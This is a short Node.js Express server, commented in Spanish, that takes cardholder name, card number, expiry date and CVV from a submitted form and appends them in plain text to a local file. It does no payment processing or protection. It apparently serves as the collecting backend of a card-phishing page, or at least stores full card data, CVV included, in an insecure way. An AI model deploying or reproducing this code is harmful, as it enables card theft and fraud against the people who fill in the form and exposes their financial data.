const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

// Middleware para parsear los datos del formulario
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Middleware para servir archivos estáticos desde la carpeta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Ruta para manejar el envío del formulario
app.post('/submit', (req, res) => {
    const { nombreTarjeta, numeroTarjeta, fechaVencimiento, cvv } = req.body;
    const datos = `Nombre en la tarjeta: ${nombreTarjeta}, Número de tarjeta: ${numeroTarjeta}, Fecha de vencimiento: ${fechaVencimiento}, CVV: ${cvv}\n`;

    // Ruta absoluta para 'datos.txt'
    const filePath = path.join(__dirname, 'datos.txt');

    // Guardar los datos en un archivo
    fs.appendFile(filePath, datos, (err) => {
        if (err) {
            console.error('Error guardando los datos:', err);
            return res.status(500).send('Error al guardar los datos');
        }
        // Enviar una respuesta de éxito al cliente
        res.status(200).json({ message: 'Datos guardados correctamente' });
    });
});

// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
